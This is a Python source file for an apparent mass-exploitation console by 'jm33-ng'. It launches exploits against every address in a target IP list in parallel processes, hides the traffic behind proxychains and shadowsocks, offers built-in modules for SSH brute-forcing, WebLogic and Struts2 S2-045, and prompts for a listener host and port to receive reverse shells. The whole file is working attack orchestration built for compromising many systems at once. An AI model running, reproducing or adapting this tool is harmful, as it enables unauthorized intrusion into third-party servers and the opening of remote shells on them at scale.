#!/usr/bin/python3
# pylint: disable=too-many-instance-attributes,too-many-statements,too-many-branches,too-many-locals,too-many-nested-blocks,broad-except

'''
mass exploit console
by jm33-ng
'''

import os
import shutil
import subprocess
import time
from multiprocessing import Process

import psutil
import tqdm

import lib.tools.exploits as exploit_exec
from lib.cli import cmd, colors, console, futil, proxy

# mec root directory
MECROOT = os.path.join(os.path.expanduser("~"), ".mec")


class Session:

    '''
    define parameters for a session
    '''

    def __init__(self):
        # root directory of mec
        self.init_dir = MECROOT
        # where to put temp files
        self.out_dir = self.init_dir + '/output'
        # where to put proxychains4 config file
        self.proxy_conf = self.init_dir + \
            '/data/proxy.conf'
        # where to put shadowsocks binary
        proxy_bin = self.init_dir + \
            '/tools/ss-proxy'
        # where to put shadowsocks config file
        ss_config = self.init_dir + \
            '/data/ss.json'
        # save output of exploits
        self.logfile = self.init_dir + \
            '/output/' + \
            time.strftime("%Y_%m_%d_%H_%M_%S.log")

        # whether to use proxychains4
        self.use_proxy = True
        # shadowsocks helper
        self.shadowsocks = proxy.ShadowsocksProxy(
            proxy_bin, ss_config)
        # is our proxy working?
        self.proxy_status = "OFF"
        # config file of proxychains4
        self.proxychains_conf = self.shadowsocks.proxychains_conf
        # target IP list
        self.ip_list = self.init_dir + \
            '/data/ip_list.txt'

    def command(self, user_cmd):
        '''
        passes to cmd handler
        '''
        cmd.cmd_handler(self, user_cmd)

    def attack(self):
        '''
        handles attack command
        '''
        self.use_proxy = console.input_check(
            '[?] Do you wish to use proxychains? [y/n] ',
            choices=['y', 'n']) == 'y'

        if self.use_proxy:
            if shutil.which("proxychains4") is None:
                console.print_error("proxychains4 not found")

                return
            cmd.cmd_handler(self, "proxy")
        answ = console.input_check(
            '\n[?] Do you wish to use\
            \n\n    [a] built-in exploits\
            \n    [m] or launch your own manually?\
            \n\n[=] Your choice: ',
            choices=['a', 'm'])

        if answ == 'a':
            print(
                colors.CYAN +
                colors.BOLD +
                '\n[?] Choose a module from: ' +
                colors.END +
                '\n')
            print(console.BUILT_IN)
            answ = console.input_check(
                '[=] Your choice: ',
                check_type=int,
                choices=['0',
                         '1',
                         '2',
                         '3',
                         '4'])

            try:
                if answ == '0':
                    self.scanner(exploit_exec.ssh_bruteforcer())
                elif answ == '1':
                    self.scanner(exploit_exec.weblogic())
                elif answ == '2':
                    console.print_error("[-] Not available")
                elif answ == '3':
                    console.print_error("[-] Not available")
                elif answ == '4':
                    self.scanner(exploit_exec.s2_045())

            except (EOFError, KeyboardInterrupt, SystemExit):
                return

        elif answ == 'm':
            print(
                colors.CYAN +
                colors.UNDERLINE +
                colors.BOLD +
                "\nWelcome, in here you can choose your own exploit\n" +
                colors.END)
            colors.colored_print(
                '[*] Here are available exploits:\n', colors.CYAN)

            for poc in futil.list_exp():
                colors.colored_print(poc + colors.END, colors.BLUE)

            exploit = console.input_check(
                "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ",
                choices=futil.list_exp())

            jobs = int(
                console.input_check("[?] How many processes each time? ", check_type=int))

            custom_args = []
            answ = console.input_check(
                "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])

            if answ == 'y':
                lhost = console.input_check(
                    "[*] Where do you want me to send shells? ", allow_blank=False, ip_check=True)
                lport = console.input_check(
                    "[*] and at what port?",
                    check_type=int)
                custom_args = ['-l', lhost, '-p', lport]
            else:
                pass

            custom_args += console.input_check(
                "[*] args for this exploit: ").strip().split()

            # parse user's exploit name
            exec_path = exploit.split('/')[1:]
            work_path = exploit.split('/')[:-1]
            exec_path = '/'.join(exec_path)
            work_path = '/'.join(work_path)

            # let user check if there's anything wrong
            print(
                colors.BLUE +
                '[*] Your exploit will be executed like\n' +
                colors.END,
                'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                    exec_path),
                ' '.join(custom_args))

            # args as parameter for scanner
            scanner_args = console.ScannerArgs(work_path, exec_path,
                                               custom_args,
                                               jobs)
            # start scanner
            self.scanner(scanner_args)

        else:
            console.print_error('[-] Invalid input')

    def scanner(self, scanner_args):
        '''
        Execute exploit against given ip list
        '''

        try:
            work_path, exec_path = scanner_args.work_path, scanner_args.exec_path
            custom_args, jobs = scanner_args.custom_args, scanner_args.jobs
        except BaseException:
            return

        if self.use_proxy:
            e_args = [
                'proxychains4',
                '-q',
                '-f',
                self.proxy_conf,
                './' + exec_path]
        else:
            e_args = ['./' + exec_path]

        # add custom arguments for different exploits
        e_args += custom_args
        # the last argument is target host
        e_args += ['-t']

        try:
            target_list = open(self.ip_list)
        except BaseException as exc:
            console.print_error('[-] Error occured: {}\n'.format(exc))
            console.debug_except()

            return

        try:
            os.chdir('./exploits/' + work_path)
        except FileNotFoundError:
            console.print_error("[-] Can't chdir to " + work_path)
            console.debug_except()
        console.print_warning(
            '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())

        # you might want to cancel the scan to correct some errors

        if console.input_check('[?] Proceed? [y/n] ', choices=['y', 'n']) == 'n':
            return

        # save stdout to logfile
        try:
            logfile = open(self.logfile, "a+")
        except FileNotFoundError:
            console.print_error("[-] Log file not found")

        # needed for the loop
        procs = []
        pids = []  # collects all pids, check if empty when finishing
        count = len(procs)

        # display help for viewing logs
        print(colors.CYAN +
              "[*] Use `tail -f {}` to view logs\n\n".format(self.logfile))

        # use progress bar
        with open(self.ip_list) as iplistf:
            total = len([0 for _ in iplistf])
            iplistf.close()
        pbar = tqdm.tqdm(total=total, ncols=80, desc="[*] Processing targets")

        for line in target_list:
            target_ip = line.strip()

            # mark this loop as done
            count = len(procs)

            try:
                # start and display current process
                e_args += [target_ip]

                proc = subprocess.Popen(e_args, stdout=logfile, stderr=logfile)
                procs.append(proc)
                pids.append(proc.pid)
                pbar.set_description(
                    desc="[*] Processing {}".format(target_ip))

                # continue to next target
                e_args.remove(target_ip)

                # process pool

                if count == jobs:
                    for item in procs:
                        if psutil.pid_exists(item.pid):
                            timer_proc = Process(
                                target=futil.proc_timer, args=(item, ))
                            timer_proc.start()
                        else:
                            pids.remove(item.pid)

                    procs = []

            except (EOFError, KeyboardInterrupt, SystemExit):
                # killall running processes
                futil.check_kill_process(exec_path)

                logfile.close()
                pbar.close()
                console.print_error("[-] Task aborted")
                os.chdir(self.init_dir)

                return

            except BaseException as exc:
                console.print_error("[-] Exception: {}\n".format(str(exc)))
                logfile.write("[-] Exception: " + str(exc) + "\n")

            finally:
                # check if any pids are done
                try:
                    for pid in pids:
                        if not psutil.pid_exists(pid):
                            pids.remove(pid)
                            pbar.update(1)
                except BaseException:
                    pass

        # make sure all processes are done

        if pids:
            time.sleep(10)

        # kill everything, close logfile, exit progress bar, and print done flag
        futil.check_kill_process(exec_path)
        logfile.close()
        pbar.close()
        os.chdir(self.init_dir)
        console.print_success('\n[+] All done!\n')